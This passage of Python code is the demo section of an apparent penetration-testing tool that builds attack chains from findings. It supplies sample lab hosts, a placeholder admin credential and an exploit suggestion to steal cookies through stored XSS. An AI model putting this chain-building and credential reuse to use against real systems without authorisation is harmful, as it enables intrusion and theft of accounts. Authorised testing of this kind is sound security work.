            title="Missing CSP — XSS potential", description="no CSP header",
            confidence="medium", score=40,
            evidence=[], exploit_suggestions=["steal cookie via stored XSS"],
            prerequisites=[], cves=[], references=[],
        ),
    ]
    credentials: List[dict] = [
        {"username": "admin", "password": "s3cr3t", "hash": None,
         "source_host": "10.10.10.88", "source_service": "mysql",
         "valid_on": ["10.10.10.88:80"]},
    ]
    hosts: dict = {
        "10.10.10.88": {
            "ip": "10.10.10.88", "services": {
                80: {"port": 80, "service": "http", "version": "", "banner": "", "enumerated": True},
                443: {"port": 443, "service": "https", "version": "", "banner": "", "enumerated": True},
            },
            "findings": [{"detail": "subject_cn=corp.example.com", "raw_data": ""}],
            "attack_vectors": [],
        },
        "10.10.10.231": {
            "ip": "10.10.10.231", "services": {
                22: {"port": 22, "service": "ssh", "version": "OpenSSH 8.2", "banner": "", "enumerated": True},
                8080: {"port": 8080, "service": "http", "version": "Tomcat/8.5", "banner": "", "enumerated": True},
            },
            "findings": [],
            "attack_vectors": [],
        },
    }
    topology = {"edges": [], "domains": ["corp.example.com"]}

    chains = compose_chains(vectors, credentials, hosts, topology)
    print(f"Composed {len(chains)} attack chain(s):\n")
    for block in format_chains_for_report(chains):
        print(block)
        print()


if __name__ == "__main__":
    _demo()
